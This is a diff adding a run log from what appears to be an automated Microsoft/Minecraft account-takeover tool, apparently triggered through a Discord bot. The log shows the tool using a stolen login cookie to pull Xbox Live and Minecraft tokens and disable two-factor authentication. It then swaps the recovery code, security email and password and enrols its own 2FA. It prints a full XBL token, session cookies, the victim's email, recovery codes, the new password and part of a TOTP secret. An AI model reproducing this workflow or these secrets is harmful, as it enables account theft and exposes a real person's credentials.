@@ -1,0 +1,101 @@
+[2026-02-04T01:10:35.102Z] [SECURE_LOGGER] Started logging for UID: jjRVqcdrL, Type: secure
+[2026-02-04T01:10:35.105Z] [STEP] secure_started - {"hasHost":true,"hasSettings":true,"username":"cheems_9565","context":{"botId":"1457030566477299846","serverName":"Lunar Client"}}
+[2026-02-04T01:10:35.105Z] [LOG] [RECODE_SECURE] Starting secure process for UID: jjRVqcdrL, username: cheems_9565
+[2026-02-04T01:10:35.107Z] [STEP] initialize_start - {}
+[2026-02-04T01:10:35.107Z] [LOG] [RECODE_SECURE] Initializing secure process...
+[2026-02-04T01:10:35.107Z] [LOG] [RECODE_SECURE] Account object created, login cookie set
+[2026-02-04T01:10:35.122Z] [LOG] [RECODE_SECURE] Axios instance initialized for UID: jjRVqcdrL
+[2026-02-04T01:10:35.128Z] [LOG] [RECODE_SECURE] Status updated: msauth for UID: jjRVqcdrL
+[2026-02-04T01:10:35.128Z] [LOG] Starting recode secure!
+[2026-02-04T01:10:35.128Z] [LOG] [RECODE_SECURE] Optional username provided: cheems_9565
+[2026-02-04T01:10:35.128Z] [LOG] [RECODE_SECURE] Getting cookies and authentication...
+[2026-02-04T01:10:36.106Z] [LOG] [RECODE_SECURE] Cookies retrieved: apiCanary=true, amsc=true, canary=true
+[2026-02-04T01:10:36.106Z] [LOG] [RECODE_SECURE] Polishing host with amsc...
+[2026-02-04T01:10:36.322Z] [LOG] [RECODE_SECURE] Host polished, msauth result: success
+[2026-02-04T01:10:36.322Z] [LOG] [RECODE_SECURE] Setting login cookies...
+[2026-02-04T01:10:36.322Z] [LOG] [RECODE_SECURE] Login cookies set successfully
+[2026-02-04T01:10:36.322Z] [LOG] [RECODE_SECURE] Starting login authentication...
+[2026-02-04T01:10:36.322Z] [LOG] Helping with login!
+[2026-02-04T01:10:36.545Z] [LOG] No link!
+[2026-02-04T01:10:36.545Z] [LOG] [RECODE_SECURE] Login helper result: authed
+[2026-02-04T01:10:36.545Z] [LOG] [RECODE_SECURE] Login successful, proceeding with authentication...
+[2026-02-04T01:10:36.545Z] [LOG] Logged in fully authed, should be able to get amrp now!
+[2026-02-04T01:10:36.545Z] [LOG] [THROTTLE] Waiting 1405ms before parallel auth requests...
+[2026-02-04T01:10:37.950Z] [LOG] [XBL] Got loginCookie: present
+[2026-02-04T01:10:37.950Z] [LOG] Trying to get XBL! Retry: 0
+[2026-02-04T01:10:37.951Z] [LOG] [AMRP] Attempt 1/3
+[2026-02-04T01:10:37.952Z] [LOG] [AMC] Attempt 1/3
+[2026-02-04T01:10:38.388Z] [LOG] [AMRP] Got T token, posting...
+[2026-02-04T01:10:38.562Z] [LOG] [AMRP] ✓ Got AMRP cookie
+[2026-02-04T01:10:39.240Z] [LOG] [AMC] ✓ Got AMC cookie
+[2026-02-04T01:10:39.755Z] [LOG] [XBL] Successfully extracted XBL tokens (uhs and xsts)
+[2026-02-04T01:10:39.755Z] [LOG] Got accesstoken!
+[2026-02-04T01:10:39.755Z] [LOG] XBL: XBL3.0 x=15380685718399147378;eyJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiUlNBLU9BRVAiLCJjdHkiOiJKV1QiLCJ6aXAiOiJERUYiLCJ4NXQiOiJnN3hlanVTXzRnOXNNdW9fLXdVeFQ5NHNHancifQ.PDcGLXGiUYqCYs52vkvFzlhajk3al8n6bcTYOf8BB8XqjS6aFlUeHJ1xRjuDFeJsVFgicirmgwqNxLrIU4b9GqpryRxjgmfACXLzWmTVudEbz8KMY3HEWBAm69A7SniIXAFsoA7XyK9fd30f4dCGpGS3z28mTq_AXqTicCkxmTp7jRjpng9XSKQN-KOosWI-dg24vFvOFnFupJargPsdbu2sJIOTR4lVBwe5wBfic4PEN04HyWLrBTgC9m0K-oCVURvJjK-ac-GxOoM74WFFth3X5Vr06LUkZd9FsIMU9lk79yvbC0wy0Zavyr9r7zzpAJ6LxqWm7NdEKhS-SuOwbw.5LI6UUacRC0g3LRvbACq-Q.o7T7_xGwlNiYzr_pamObocA84f9s5DG5EDDD5MejaIXP0yB8ONzWgiICqqWL_tUmTTDR1HLPAqZSk0eACYg0_aa_x4WxyMFk1Akn_UUK4tgKOL_Tv_dMiXU9LhfbbupsuNsPfkPttAA8CYZqU-NIWyZJRmIwfhOY_HpzCg-noQwNBgXz_3jBEnmMM5Z8OrwMqaCTFIArC1yG3KJvk_g6-EOyNV1CJ2wY7SQuoe5soV4XzLtvpQJNgsJG0dp0JCKKyvGEbXYugefe6gVg8bIPr3TMzdTtINe54lNIFE0oSIFhz5EmfiuapQ4Fgp7l-iTojYga8VkdVT6TIS03so90fcDRCBDE9qqKy_FJn3qS3NVnqVzw4NyYQnkshDGUkuI39f9H5LVtKiM28P99eTsGoJoxEzQnUyC4ybcgkiUSUl-WvZUpejFVq4vD1-zxGtunhDlIGikymAKOSrHPbqNRjJZorkrDTbsQrIkea3zdkDV62EDvLbxocflJOpMsWg8K2tmwi-hB1ObQycJZGcHyscILa3_F5_5A4sqyxJe_TCgOuX2AZahnT-cdzrSB4reFknR8N6lF1ekIXxNfiLCDMWoOUM0cPXOLJDyQdnPVmMrlSLtsSiD2YTuYB5Nwtcm1OQetGKj43RfwrYneAldvW1cBRzqsGnoSt8ISC5K6XMfUuQjckm1C6QORTziftQio8-dJFdab7p2lT4Zd0wxUPEtqReMv_s3nPHS8YSLrEo4QuJWswLkfUNHG2VpTyNsoCIgFESRAv8sFNEgx-gJXf3e_JhqHy-K534VwS8UWcb6kHcvM2Hn-sHJpa5McVuR231N498squmNW-P6b9FoAl1ec-MCckt-mYMp7z3YQRjdDbGnz4QNLs_8m9LraDnr4nSBLKsdny-gE0uj7-DHEeqdbe2q7sosUn1ZclQ6JOR2_PXS7kZvJmiHDDb7HpESl5cuQ6a_BFqbmyNT4TIAB8AhOug2qLiTXhuSwzccpdCYzEonyuxM-qmU67jMDaC7ALmAYI_2VXRt2on5dZY00cErPGPOqZJu2wEYDzwVfdali3Wr4nJNqCnjGRLCja6Anspc_NLCWiLh1XRzKNNc-563g8SvBHl1nCDDP76YYDs0ARDtgCEHaZ9D1dzfV3K7g2Bv2EXmwMbliDwmGbFMhaRMhQijMIfhuurYVBXAxwhVlBF0sj50T2r9Eeq5vNro6c2R_zWhoDwT7VLWG8RIRQoifJAIwqVnu-dGW-I8msip7tDf13_hCHqjW9zR002mGk99iiooiGfDbVGUKo8GThdsK9QfLvTYNKmIZ_DEn_j_DgkqXYg8z2iFLYBTAnASRYr7xP8UY-7ikh0QcQVrVeMpjGwxTmhP3bPm4Yo2aW3Kbuna62dTOr3rK14BA8VayTfwuxJYvwQHvNWejGku6EwEMrJbtLCRmzhYBi01yUK63O15uJ6zb0rihe3OFzW43glED7QxrImo1DudH20fUw4WffFZkAZ2DRi3sjVpcSsrkK7RT8IPz84lyYr4xFDlxxmM8sKw1xqMnCFgk82m8najeuTDmJ7Vz1JUirXpfOiN2dwSSFHSDVTwSUsg9tEROqBUcVZi0fqwDhZ1Sc6NuOFqOhC1FxcmKjK0oo_2PMhDowVbC-ULI82uA0BNWdqo43hvHHLVlA-YpkkP0-NLAEAuU31GfMeLBrnESKdFJR37IzTsLDnvD2fABd0j_Xq1YbpIpYnK7ZAzYiR-J66wKUQ73QUMR_XDyczLj1eMZZcmbw9MYmbG7qcGdE8yrqioT.59T6jHC32df7V1rAOyH0EQ
+[2026-02-04T01:10:40.087Z] [LOG] Got AMRP
+[2026-02-04T01:10:40.087Z] [LOG] Got AMC
+[2026-02-04T01:10:40.087Z] [LOG] Got AMCJWT
+[2026-02-04T01:10:40.871Z] [LOG] Checking Minecraft account
+[2026-02-04T01:10:40.876Z] [LOG] Got XBL
+[2026-02-04T01:10:41.485Z] [LOG] [ssid.js] Successfully obtained SSID access token
+[2026-02-04T01:10:41.485Z] [LOG] Got SSID
+[2026-02-04T01:10:42.181Z] [LOG] Minecraft source: Purchased
+[2026-02-04T01:10:42.188Z] [LOG] Got Minecraft ROSHAK_7
+[2026-02-04T01:10:42.192Z] [STEP] minecraft_found - {"username":"ROSHAK_7"}
+[2026-02-04T01:10:42.192Z] [LOG] Setting mc as Purchased
+[2026-02-04T01:10:42.824Z] [LOG] No unverified emails found
+[2026-02-04T01:10:42.839Z] [LOG] Amrp: FAC2CRR/xxd2GHag4yTFVpmUADEDI33xRQ5mAAAMgAAAEGj%2BUzp%2B0iV0BF62OkvSVnBgCZn/y0S9neFsHhcYg%2B97BLE32PSR176oXnj4JkKNrVYvhL/GsI7C/l7vQBGCUkC%2BIQf5HW1jGq1oN33N8acA%2BpfufmGu26depD/svV6gaR/h/4cy9TjoojJ235alb3riY2OgnXEvKZpaVi9BbkkC0QGICCiA%2BpWhXjFLT%2BSYrw%2BRFwT3WLotmuEvB/d59kZUvvVz6XnEhtNtHjK7B2tunfJ/Rk0nCHRBsNUfpKncCC%2BJr6/O%2BZQsJtg4hFkqmmPn9KT0IpuIdHgwtrIUGUJbENngjuruhuTWlb4ZIPURnY7O5Q5tdrT7sIunOYkqiD41YNGWcfu5YX4H1UaQjuVhkh2iXH35/47nmvnVTCUgJ1SfqLP3e30wcTyHk9EC4V4ijrb3CMWfB2BjqECE2RsuEcabTyUPD1W039Lhe5ebIclGz/aMvf4RpgY23yc4hpnOA2GY2ogQn3UvVx1IYrgDukaHczQg9NMgb7CpsfykyHBnPh/YuuehGjY5076NHYgPuhUvX9EVfVtf13P8dIXEXCnXTF9JwxF4q3tygn5G%2B/DOc8ZFfDH0Hd0S/th6hQHuUVzbkQCFoY860%2BXOyKlx96KpOrfCJuZKzQEVT10Lm11nbKZF068MnRsgZanI8tKbEBFvAoz%2BxwUqCVe5JDFbLGm9qYfBMr%2BsvMHsa3BU/w64c0LH7ogW3izElc2QaPlGAm6zW5EWiIVFsLLCYqel88FAoW4iELdW6Z97/fPaMXh3/HwcX3D37rt4Fg4XiDtrXEr3u8GWrOPt6bblPLOMl6jMIXgXnidzdna4vHP%2BR2DZZuwuvW65AxAla%2BxFhDfp0yq53Wbst51Z5Fbs0RxydJCiRu8mDZ7uebXUP6T1qh8GFqykYIlSioQ371sbRjaNEuJU7MPiM1jeM2JpaQ7X3yBW4lEkkYeGG3anNiyWNUxg7Lyj1BX6yGP8yx4PKtPXdjDkxyFX55lj%2BWghn3zR3sZ2xCkSit0h/oqpxC7H4Qqf26l3alPsIdTRpjvtdlnRk8IM0PvpLWDE%2BiO4hFpzgoOZlDi1uJv6ZGiZbB0kIDeff9ALTgA%2BCNsnvk8rU7jWCruHR8iT5L5CLshDHX63VWNMSeXOhuVrOKLQxLGGX7N%2BwIOQfuMuU5aCtkd%2BuAvnrpeWqPYtwTy6PkNDNWwSRcPNd%2BYrcF7On4zhz0aL%2BsWQBMLMwVf0FVLBK/Shk92HkMO6fn5%2B35rSry46JnYsMKcsyFG4ea/Qa6P5G2jUDnOsqt2oQKPjRVetCtNIQn7Svgwpnvfdjz9nXxWvOyLfDcjtKYLOFMZEzUYhwOxDp8pCY2Ms8sxnV45JZU%2Bqs%2BdnPGMlm1ApAlYeJRSVBLHu6whjGgfxXIekTpGsMvln8tLg0%2BMwwMPRu7/kfXPAq19WF204lWX2rQ1Mtzu8xl5D7zgQFtly4qG93VpWTOEukHxNpfQXaZZ00ECSOLSJXGwXWCfMqRlvLs6qtIzmfahBarsGEY6OG1Ra4kEVEYuDTYWxSaFWNzxiPMCMFA5ae%2BhkILEywSnOZiKETHbbssNzX3riNgh0g03DulcXlPmYaLdZBKhYLWC81b7xyW5krO%2BPjpYcU5J7PqnYjclSPZeXlzdSj2SC0lhGcUayvSTKKjUIyoSAdcGd3uKMR4yz9aDg/1KDtplMwUC/VtPMbpNocyF/qqVbeZ9ExuUensWmTIYjxvFbRY/X3N%2B7fMm032XwYFgSJZU5VtVN5D4fynpl6GQaCWaicmhQPvDlhDAMiWDazg4M1YnCu7vaDTkDYqmaJVX6UMEovFbF27EWNOa%2BLs0hbllnuYaqQ99WfyJ/zt0JhEqXPabUmAk4nNAP8ug8Ci3wFA29xHLwT5KxhXyqUqYk/DcuNodSuKE5x5jqRWxOBFeXWnAk6LqQ9RnJLf4/pn%2BnyYv9iFkzIcDPI37%2BWIokttAQPQRZKNZtzZGyC2OTGp0Tw3aNnr5eerxmOtB7pTzLDLwNGY4nRUVqd%2B8ITaxObI0wFqs/axm3FVFcWEfHtHwsH%2BbFc4M5sUuoN3gJLYz6eM3EFw89Hs139vzWNxK7p/U6dcO6/UJ/kw8IJDFi4j6Qd1BA8Q4MkgpsGIDqoBuBrffNTrtIvfTJyt8FVq2V9%2BqWi0RPyG7R1qmL88n0T%2BOFbcDSd5XMS%2BFwOo3Z7WgUMWL7FaBC5qB77QzfuNI53QAx22oJUmOOIjsEOtfoNzhOk1lX6JIKzlstO15aDBQaTbmvudryweXCiwCQ0WtXKRyuY0fuzoNHuLA9c5aclm5XEAMBwmjxIt5FS8YPO3T1S9J7hOozTsIFAfJK8GGQvBxDXpLhWuf0gMy5h%2BE9xp9VV%2BRKkm16nju/ysUZl1ZzwsSHetThCTm8GCW/u2G0YyCOdGLFI5mgPaIGVL8DbXUHzndRBBOyuxtcXrrih0Hc3zQqGkT3vS5AW9H/KH4k8wP62mZQcrYFmp7ZgKPZfXcIfukncSXD0hpdH%2B8h6c/dcjkOo7wOikguJ3qFZ8LUH5LL3MsOIXf5tuESlaVu5ZMOvxp/hQPEfsIH5dhEfQ%2BWdjgaGACR2/qBoWgU4mVMTRtLKaxH2WK0wEZoXBd3ozr3dcyKwBrhPaBpDxckc81LoS9SHWUnHiAaMXCLeMdWi8BhpuEB3hGBDqd%2BbXta4/MmqLvVVk9%2BYl0/5TKbagYiuAf5kg657wgu9TmlhmudrsWCnwHU5PGrCWFUPtxMQNmhXS3qA2wboJaeUg2WzK3Bmv448XmnOTLYhtXIrSyarveEzeqbHXhBZBVGXZvCcnLy6YmhRJMe0J5pYK9Tbo7VXa8GZCj3Z5rgYGvE0cib9BaH%2BqyqV3YZg/VBN69oWK%2BznZd/zY9bnVWq7vl%2BnJ2vC1Gj6ine87OOHPq3DFus2URchB0rgn9k0RHjZKHkWt5BYW3uGStG8lxkMtqK8gg6JQf9S9knLxcRweIooxUfswcnHN6ePB05cWqw%2BH4PaPKMJ3Tus0aMHAY0hl%2BTBJ1ZpqzI/s1v4wYCesdduRiNqijEKx/b15DGHiBW/mtjPy93dtP3HhLVsZLYEt8N7K3NMUXKckPJAwtCEz0kUoi/rjPNpNA7pYHOpLkqOp8uaXnQruJwl2VXYWgBXQaO703C3PjNKpPV8NnMrhaWoOPxz5KV10pM3v/wfmem7/g8JgveQamy/GJhDCqgr/VfoyAAYJl/4/iMtVgAe9dhri/n//yczBOFW2gO0/SfjI1sUx4%3D & amsc: YgJHO32ql3yNXniyDnEbG9kjmLxUkJ6edtUSdAjOjZ8tD0tPO5Hvc4pSxfd8ZVymkvdzZMqqAUd5vRXBtzm7gC5L3+h+JVrdspm2NV5Dwzldghbp+9CITT7n2hOwKrXbX9lqxTalc/y0KqBACFFv8R1puO9O8gdEF4EvkOUglOKkA35JJBxJWdjEoQdkh642DMZhqkltuLBAObC7fwnl8naBwMHGMAB6i8u4ymBlHulkWRSpeUcq9mIbpZL6xEKvYEP9gBHVbS1zp5QDkMTg4oQE1qqSvGKkFCxrd9ZzPezwIMzrmaqbxHIcgk37UKov:2:3c
+[2026-02-04T01:10:43.464Z] [LOG] Disabled TFA (if applicable)
+[2026-02-04T01:10:44.099Z] [STEP] email_retrieved - {"email":"sanjodelval8000@gmail.com"}
+[2026-02-04T01:10:44.102Z] [STEP] recovery_retrieved - {}
+[2026-02-04T01:10:44.108Z] [STEP] security_data_retrieved - {"hasRecovery":true,"hasSecEmail":true,"hasPassword":true}
+[2026-02-04T01:10:44.108Z] [LOG] Getting data for user jjRVqcdrL!
+[2026-02-04T01:10:44.112Z] [LOG] [RECODE_SECURE] Starting recovery/security update...
+[2026-02-04T01:10:44.112Z] [LOG] Netid at handlerecsecure: 0hRwQMYfyONNcNFCaZhbdnGrFrBvJKzAX5uVtuwtvIh4DX3C0/51sZuuHNEABMpjUVlGlnaPwfFrTsIFg43sXXrLQuCq1Qc8gJhYi0wRwwLGpY0R30hYKorzzGUrNMLW:2:3
+[2026-02-04T01:10:44.112Z] [LOG] [rec-secure] Recovery secure called with email=sanjodelval8000@gmail.com recovery=G892K-CTRCF-6376T-NPKTB-WQ5KW
+[2026-02-04T01:10:44.113Z] [LOG] [rec-secure] Context attempt 1/3
+[2026-02-04T01:10:44.113Z] [LOG] [RECODE_SECURE] Waiting for addzyger ready signal...
+[2026-02-04T01:10:44.113Z] [LOG] Got into alias!
+[2026-02-04T01:10:44.113Z] [LOG] Aliasses canary: oFxILbmsCpoi2Jd61EKDbTHvfkDpx11liFPqUgeUuD/yPhqIgcGKazgtMPq8d+trkiN3dOrHO3C9WpUvXhkzE5aAWdTKN1L3mWDXt7I44MP4n3u9Ojz1cCH2ebjcgaWLNbj4xWchFVyD7meawXq9/NIKA6z7q1mK3YphwaKuvTcqsVjH1VOZNxm5IT7QhocAQbiWYq4a3C8pZmqNUjPWdVwjzEn9NW8M9oJmg2pUpSEgH26txoPchzk6EidpIl/a:2:3c
+[2026-02-04T01:10:44.113Z] [LOG] Canary 2: yvh3Wr2R5e1TbQyYpsHITovBfqFCi6qwUqfUSuWvTBY=3
+[2026-02-04T01:10:44.114Z] [LOG] Setting to {"firstname":"Option is off.","lastname":"Option is off.","dob":"Option is off.","country":"Option is off.","language":"Option is off."}
+[2026-02-04T01:10:44.299Z] [LOG] No OAuths found.
+[2026-02-04T01:10:44.731Z] [LOG] Disconnected from the authenticator: 1006 - 
+[2026-02-04T01:10:44.731Z] [ERROR] Error getting Lunar data for user jjRVqcdrL: Error connecting to the authenticator
+[2026-02-04T01:10:45.025Z] [LOG] Section "All MC Extra Tasks" completed in 0.87 seconds
+[2026-02-04T01:10:45.085Z] [LOG] [X] Failed to add z26zwiklafh2j3i9@outlook.com as an Alias for the Account!
+[2026-02-04T01:10:45.210Z] [LOG] [getUUID] UUID from playerdb.co for ROSHAK_7: 14324194fbec4b4e8b729645d438a15f
+[2026-02-04T01:10:45.428Z] [LOG] Failed to remove No OAuths oAuths!
+[2026-02-04T01:10:45.830Z] [LOG] Section "Total Remove Section" completed in 1.68 seconds
+[2026-02-04T01:10:45.948Z] [LOG] [rec-secure] telemetryContext missing, proceeding without it (Microsoft may reject).
+[2026-02-04T01:10:45.955Z] [LOG] [rec-secure] Verify attempt 1
+[2026-02-04T01:10:46.863Z] [LOG] [rec-secure] Recover attempt 1
+[2026-02-04T01:10:48.355Z] [LOG] Got details: {"email2":"sanjodelval8000@gmail.com","recoveryCode":"SZRAK-NHALE-ZUKV4-8KFYJ-J9UJV","secEmail":"ROSHAK_7.7893@auto-secure.lol","password":"awhrpnc7lyiwoykq"}
+[2026-02-04T01:10:48.355Z] [LOG] %s: %s recoveryTime 4.243s
+[2026-02-04T01:10:48.372Z] [LOG] [RECODE_SECURE] Recovery/security update completed.
+[2026-02-04T01:10:48.373Z] [LOG] [RECODE_SECURE] addzyger ready signal received: true
+[2026-02-04T01:10:48.373Z] [LOG] Adding Zyger!
+[2026-02-04T01:10:48.373Z] [LOG] [THROTTLE] Waiting 2805ms before before Zyger 2FA setup...
+[2026-02-04T01:10:51.178Z] [LOG] [getsecretkey] Attempt 1/3
+[2026-02-04T01:10:52.018Z] [LOG] [getsecretkey] Found secretkey: ovjo c7mz q2zu pmuk...
+[2026-02-04T01:10:52.018Z] [LOG] [getsecretkey] Found proof: 6528110063858838499...
+[2026-02-04T01:10:52.018Z] [LOG] [getsecretkey] Found rvtkn: 0%3ak79iiCRHxJ6fI7He...
+[2026-02-04T01:10:52.018Z] [LOG] [getsecretkey] ✓ Successfully extracted all fields on attempt 1
+[2026-02-04T01:10:53.499Z] [LOG] Retry 1 failed. Retrying.
+[2026-02-04T01:10:54.330Z] [LOG] Retry 1 failed. Retrying.
+[2026-02-04T01:10:54.504Z] [LOG] Retry 2 failed. All retries exhausted.
+[2026-02-04T01:10:54.504Z] [LOG] Retry 1 failed with proxy. Retrying...
+[2026-02-04T01:10:54.505Z] [LOG] Retry 1 failed. Retrying.
+[2026-02-04T01:10:55.508Z] [LOG] Retry 2 failed. All retries exhausted.
+[2026-02-04T01:10:55.508Z] [LOG] Retry 2 failed with proxy. Retrying...
+[2026-02-04T01:10:55.510Z] [LOG] Retry 1 failed. Retrying.
+[2026-02-04T01:10:56.513Z] [LOG] Retry 2 failed. All retries exhausted.
+[2026-02-04T01:10:56.514Z] [LOG] Max retries reached. Attempting without proxy...
+[2026-02-04T01:10:57.828Z] [LOG] TFA confirmed successfully.
+[2026-02-04T01:10:57.828Z] [LOG] TFA successfully confirmed!
+[2026-02-04T01:10:58.309Z] [LOG] No OAuths found.
+[2026-02-04T01:10:59.023Z] [STEP] process_complete - {"timeTaken":23.9}
+[2026-02-04T01:10:59.023Z] [SECURE_LOGGER] Completing process...
+[2026-02-04T01:10:59.025Z] [SECURE_LOGGER] Process completed in 23924ms
+[2026-02-04T01:10:59.026Z] [LOG] [DEBUG] submit.js: secure() returned
+[2026-02-04T01:10:59.053Z] [LOG] Embed worked!
+[2026-02-04T01:10:59.053Z] [LOG] [LISTACCOUNT] Added stats embed to message
